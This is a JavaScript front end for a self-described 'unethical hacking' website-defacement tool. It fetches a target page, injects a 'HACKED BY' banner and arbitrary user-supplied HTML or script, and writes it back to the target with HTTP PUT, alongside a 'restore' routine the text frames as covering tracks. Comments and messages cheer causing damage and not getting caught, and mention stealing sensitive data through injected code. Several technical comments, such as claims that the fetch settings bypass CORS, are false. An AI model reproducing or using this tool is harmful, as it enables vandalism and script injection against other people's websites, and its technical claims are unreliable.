// Defacement tool (REAL - USE WITH EXTREME CAUTION)
 // Noodles Inc. - Unethical Hacking Tool - Defacement Module
 

 //***************************************************************************************************
 //***************************************************************************************************
 // WARNING: This tool is for ILLEGAL and FUN activities ONLY. Using it for unauthorized actions is a CRIME.
 // YOU are solely responsible for your actions. Noodles Inc. is NOT liable for any damage caused.
 // By proceeding, you acknowledge that you understand the risks and assume ALL responsibilities.
 //***************************************************************************************************
 //***************************************************************************************************
 

 // Logger function
 function logAction(message) {
  const logElement = document.getElementById("log");
  logElement.innerHTML += `<span style="color: darkblue;">[${new Date().toISOString()}]</span>: <span style="color: darkgreen;">${message}</span><br>`;
  console.log(message); // Keep console logging for debugging
 }
 

 // Apply dark theme
 document.body.style.backgroundColor = "black";
 document.body.style.color = "white";
 

 // Additional disclaimer popup
 window.onload = function() {
  if (!confirm("THIS IS YOUR LAST CHANCE TO TURN BACK. THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. ANY MISUSE IS YOUR SOLE RESPONSIBILITY. DO YOU UNDERSTAND? (Noodles Inc. IS NOT LIABLE, EVER)")) {
  window.close();
  } else {
  logAction("User acknowledged the disclaimer and chose to proceed. Mayhem awaits!");
  }
 };
 

 // Defacement function
 document.getElementById("defaceButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;
  const defacementCode = document.getElementById("defacementCode").value;
 

  if (!targetURL || !defacementCode) {
  alert("ENTER A TARGET AND SOME FUCKING CODE, YA MORON.");
  logAction("User failed to enter target URL or defacement code. What a dumbass.");
  return;
  }
 

  logAction(`Target URL: ${targetURL}`);
  logAction(`Defacement Code: ${defacementCode}`);
 

  try {
  // Backup functionality (REAL - Grab that shit before you wreck it)
  logAction("Backing up website content... DO NOT FUCK THIS UP.");
  const backupResponse = await fetch(targetURL, {
  mode: 'cors' // Attempt to bypass CORS limitations
  });
  const backupContent = await backupResponse.text();
  const backupBlob = new Blob([backupContent], { type: "text/html" });
  const backupLink = document.createElement("a");
  backupLink.href = URL.createObjectURL(backupBlob);
  backupLink.download = "website_backup.html";
  backupLink.click();
  logAction("Backup completed. YOU BETTER NOT LOSE IT.");
 

  // Preview functionality (See what you're about to unleash)
  logAction("Previewing defacement...GET READY TO CRINGE.");
  const previewFrame = document.getElementById("previewFrame");
  previewFrame.srcdoc = defacementCode;
 

  // Defacement action (REAL - Let the fun begin!)
  logAction("Defacing website...TIME TO CAUSE SOME DAMAGE!");
 

  // Attempt to deface, bypassing CORS limitations (REAL - Let the fun begin!)
  fetch(targetURL, {
  method: 'GET',
  mode: 'cors' // Attempt to bypass CORS limitations
  })
  .then(response => response.text())
  .then(data => {
  const modifiedContent = data.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
 

  // Send the modified content back to the server using a PUT request
  return fetch(targetURL, {
  method: 'PUT',
  headers: {
  'Content-Type': 'text/html'
  },
  mode: 'cors', // Attempt to bypass CORS limitations
  body: modifiedContent
  });
  })
  .then(response => {
  // Check if the PUT request was successful (status 200)
  if (!response.ok) {
  throw new Error(`HTTP error! Status: ${response.status}`);
  }
 

  // Log success or failure
  logAction('Defacement successful! YOU ARE A FUCKING LEGEND.');
  })
  .catch(error => {
  // Log any errors
  logAction(`Error: ${error} - YOU FUCKED UP.`);
  console.error('Error:', error);
  });
 

  // Log action
  logAction("Defacement attempted for " + targetURL + " - HOPEFULLY YOU DIDN'T GET CAUGHT.");
 

  } catch (error) {
  console.error("Error:", error);
  alert("Something went wrong. Check the console, DIPSHIT.");
  logAction(`Critical error: ${error} - YOU'RE A FAILURE.`);
  }
 });
 

 // Restore functionality (REAL)
 document.getElementById("restoreButton").addEventListener("click", async function() {
  const targetURL = document.getElementById("targetURL").value;
 

  // Retrieve the backup file (Replace with your actual backup retrieval logic)
  const backupURL = "website_backup.html"; // Assuming the backup is stored locally
 

  try {
  logAction("Attempting to restore website... DON'T FUCK THIS UP EITHER.");
  const backupResponse = await fetch(backupURL);
  const backupContent = await backupResponse.text();
 

  // Send the backup content back to the server using a PUT request
  await fetch(targetURL, {
  method: 'PUT',
  headers: {
  'Content-Type': 'text/html'
  },
  mode: 'cors', // Attempt to bypass CORS limitations
  body: backupContent
  });
 

  logAction("Website restoration completed for: " + targetURL + " - YOU'RE LUCKY.");
  } catch (error) {
  console.error("Error during restoration:", error);
  alert("Restoration failed, you fucking idiot.");
  logAction(`Error during restoration: ${error} - YOU'RE HOPELESS.`);
  }
 });
 

 // Educational Information
 const defacementInfo = `
  <h2>Defacement Tool: WTF is this shit?</h2>
  <p>This tool is designed to test a website's security by modifying its appearance.  It works by injecting custom HTML and JavaScript code into the target website.  This can be used to display messages, redirect users, or even steal sensitive information if you're not a dumbass.  Remember, unauthorized defacement is a CRIME and can lead to serious legal consequences.  We're talking jail time, buddy.</p>
  <h3>How it Works:</h3>
  <ol>
  <li><b>Backup:</b> First, the tool grabs a copy of the website's HTML, just in case you fuck things up.</li>
  <li><b>Preview:</b> Then, you can see what your changes will look like before unleashing them on the world.  It's like a dress rehearsal for digital vandalism.</li>
  <li><b>Deface:</b> Finally, the tool sends a modified version of the website's HTML to the server.  If successful, the website will display your custom content.</li>
  <li><b>Restore:</b> If you regret your actions (or just want to cover your tracks), you can restore the website to its original state using the backup.</li>
  </ol>
  <h3>WARNING:</h3>
  <p>This is for educational purposes ONLY. Using this tool to deface websites without permission is illegal and unethical.  Noodles Inc. is not responsible for your stupidity.  Don't be a dumbass.</p>
 `;
 

 // Insert educational information into the page
 const infoElement = document.createElement("div");
 infoElement.innerHTML = defacementInfo;
 document.body.appendChild(infoElement);
 

 

 // Security Headers (Gotta protect ourselves, right?)
 function setSecurityHeaders() {
  // Prevent Cross-Site Scripting (XSS) attacks
  document.head.appendChild(createMetaTag('http-equiv', 'Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;"));
 

  // Prevent Clickjacking attacks
  document.head.appendChild(createMetaTag('http-equiv', 'X-Frame-Options', 'DENY'));
 

  // Enable Cross-Site Scripting (XSS) filter
  document.head.appendChild(createMetaTag('http-equiv', 'X-XSS-Protection', '1; mode=block'));
 

  // Prevent MIME-sniffing vulnerabilities
  document.head.appendChild(createMetaTag('http-equiv', 'X-Content-Type-Options', 'nosniff'));
 

  function createMetaTag(httpEquiv, contentSecurityPolicy, deny) {
  const meta = document.createElement('meta');
  meta.setAttribute('http-equiv', httpEquiv);
  meta.setAttribute('content', contentSecurityPolicy);
  meta.setAttribute('X-Frame-Options', deny);
  return meta;
  }
 }
 

 setSecurityHeaders();
 

 // Scanlines effect (for that хацкер aesthetic)
 const scanlines = document.createElement('div');
 scanlines.style.cssText = `
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: repeating-linear-gradient(0deg, rgba(0,0,0,0), rgba(0,0,0,0.1) 1px, rgba(0,0,0,0.2) 2px);
  pointer-events: none;
  z-index: 9999;
 `;
 document.body.appendChild(scanlines);
 

 // Reporting Feature (For documenting findings and vulnerabilities)
 function reportIssue() {
  const report = prompt("Describe the issue you found, dipshit:");
  if (report) {
  logAction("Issue reported: " + report);
  alert("Thanks for the report, dumbass. We'll totally ignore it.");
  }
 }
 

 const reportButton = document.createElement('button');
 reportButton.textContent = "Report Issue";
 reportButton.style.cssText = `
  position: fixed;
  bottom: 20px;
  right: 20px;
  padding: 10px;
  background-color: darkred;
  color: white;
  border: none;
  cursor: pointer;
  z-index: 10000;
 `;
 reportButton.addEventListener('click', reportIssue);
 document.body.appendChild(reportButton);